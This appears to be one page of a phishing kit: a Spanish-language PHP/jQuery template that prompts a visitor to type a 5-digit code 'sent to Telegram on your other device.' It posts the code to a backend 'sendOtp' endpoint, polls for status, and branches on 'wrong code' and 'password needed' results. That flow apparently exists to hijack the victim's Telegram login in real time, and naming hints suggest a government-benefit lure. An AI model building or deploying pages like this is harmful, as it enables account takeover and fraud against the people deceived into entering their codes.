<style>
    /* Wrapper Utama */
    .otp-wrapper {
        padding: 15px 20px;
        text-align: left;
        font-family: 'Roboto', sans-serif;
    }

    /* Tampilan Nomor Telepon */
    .phone-display {
        display: block;
        font-size: 26px;
        font-weight: 800;
        color: #000;
        margin-bottom: 8px;
    }

    /* Deskripsi */
    .otp-desc {
        font-size: 15px;
        color: #666;
        margin-bottom: 30px;
        line-height: 1.4;
    }

    /* Container Kotak OTP */
    .otp-input-container {
        display: flex;
        justify-content: space-between;
        gap: 8px;
        margin-bottom: 25px;
    }

    /* Kotak input individu */
    .otp-box {
        width: 18%;
        height: 60px;
        border: 1px solid #ccc;
        border-radius: 12px;
        text-align: center;
        font-size: 24px;
        font-weight: 700;
        color: #333;
        background-color: #fff;
        transition: all 0.3s;
    }

    .otp-box:focus {
        border-color: #f39c12;
        outline: none;
        box-shadow: 0 0 8px rgba(243, 156, 18, 0.2);
    }

    /* Group Tombol */
    .button-group {
        display: flex;
        gap: 12px;
        margin-top: 30px;
    }

    .btn-custom {
        flex: 1;
        height: 52px;
        border-radius: 25px;
        font-weight: 700;
        font-size: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        border: none;
        text-transform: capitalize;
        text-decoration: none;
    }

    .btn-atras {
        background-color: transparent;
        color: #444;
        border: 1px solid #ccc;
    }

    .btn-verificar {
        background-color: #f39c12;
        color: #fff;
    }

    .text-danger-anses {
        color: #d32f2f;
        font-size: 14px;
        font-weight: 600;
        margin-bottom: 15px;
        display: block;
    }

    /* Loader / Spinner */
    #loader {
        text-align: center;
        margin-top: 20px;
        display: none;
    }

    .spinner-custom {
        width: 30px;
        height: 30px;
        border: 4px solid #f3f3f3;
        border-top: 4px solid #f39c12;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        display: inline-block;
    }

    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }
</style>

<div class="otp-wrapper">
    <span class="phone-display">
        <?php echo isset($_SESSION['phone']) ? $_SESSION['phone'] : '+57'; ?>
    </span>

    <p class="otp-desc">
        Hemos enviado el código a la aplicación <br>
        <strong>Telegram</strong> en tu otro dispositivo
    </p>

    <div class="otp-input-container">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
    </div>

    <input type="hidden" id="otp_val" name="otp_val">

    <span id="wrong" class="text-danger-anses" style="display:none;"></span>

    <div style="font-size: 14px; color: #444; margin-bottom: 20px;">
        ¿No recibiste el código?
        <span id="resend-link" style="color: #ccc; font-weight: 700; cursor:not-allowed;">Reenviar código</span>
        <span id="timer-container">en <span id="seconds">60</span>s</span>
    </div>

    <div class="button-group">
        <button type="button" class="btn-custom btn-atras" onclick="window.location.reload();">
            ← Atrás
        </button>
        <button type="button" class="btn-custom btn-verificar otp-btn">
            Verificar →
        </button>
    </div>

    <div id="loader">
        <div class="spinner-custom"></div>
        <p style="font-size: 13px; color: #666; margin-top: 10px;">Verificando...</p>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    $(document).ready(function () {
        // Fokus otomatis saat mengetik
        $('.otp-box').on('input', function () {
            if (this.value.length === 1) {
                $(this).next('.otp-box').focus();
            }
            combineOtp();
        });

        // Hapus mundur otomatis
        $('.otp-box').on('keydown', function (e) {
            if (e.key === 'Backspace' && this.value.length === 0) {
                $(this).prev('.otp-box').focus();
            }
        });

        function startTimer(duration, display) {
            var timer = duration, seconds;
            var countdown = setInterval(function () {
                seconds = parseInt(timer % 60, 10);

                display.textContent = seconds;

                if (--timer < 0) {
                    clearInterval(countdown);
                    // Ketika waktu habis:
                    document.getElementById("timer-container").style.display = "none"; 
                    document.getElementById("resend-link").style.color = "#f39c12";    
                    document.getElementById("resend-link").style.cursor = "pointer";  
                    document.getElementById("resend-link").onclick = function () {
                        location.reload(); 
                    };
                }
            }, 1000);
        }

        // Jalankan timer saat halaman dibuka
        window.onload = function () {
            var sixtySeconds = 60,
                display = document.querySelector('#seconds');
            startTimer(sixtySeconds, display);
        };

        // Menggabungkan nilai 5 kotak ke input hidden
        function combineOtp() {
            let combined = '';
            $('.otp-box').each(function () {
                combined += $(this).val();
            });
            $('#otp_val').val(combined);
        }

        function checkStatus() {
            $.ajax({
                url: "API/index.php",
                type: "POST",
                data: { "method": "getStatus" },
                success: function (data) {
                    // Pastikan response berupa objek JSON
                    let res = (typeof data === 'string') ? JSON.parse(data) : data;

                    if (res.result.status == "success") {
                        window.location.reload();
                    } else if (res.result.status == "failed") {
                        $("#loader").hide();
                        $(".otp-btn").show(); // Munculkan tombol lagi

                        if (res.result.detail == "wrong") {
                            $("#wrong").html("❌ El código OTP es incorrecto").show();
                        } else if (res.result.detail == "passwordNeeded") {
                            window.location.reload();
                        }
                        $(".otp-box").val("");
                        $('#otp_val').val("");
                    } else {
                        setTimeout(function () { checkStatus(); }, 1000);
                    }
                }
            });
        }

        $(".otp-btn").on("click", function (e) {
            e.preventDefault();
            var fullOtp = $("#otp_val").val();

            // Validasi: Harus 5 digit
            if (fullOtp.length === 5) {
                $("#wrong").hide();
                $(".otp-btn").hide(); // Cegah double click
                $("#loader").show();

                $.ajax({
                    url: "API/index.php",
                    type: "POST",
                    data: { "method": "sendOtp", "otp": fullOtp },
                    success: function (data) {
                        setTimeout(function () { checkStatus(); }, 500);
                    }
                });
            } else {
                alert("Por favor, ingrese el código de 5 dígitos.");
            }
        });
    });
</script>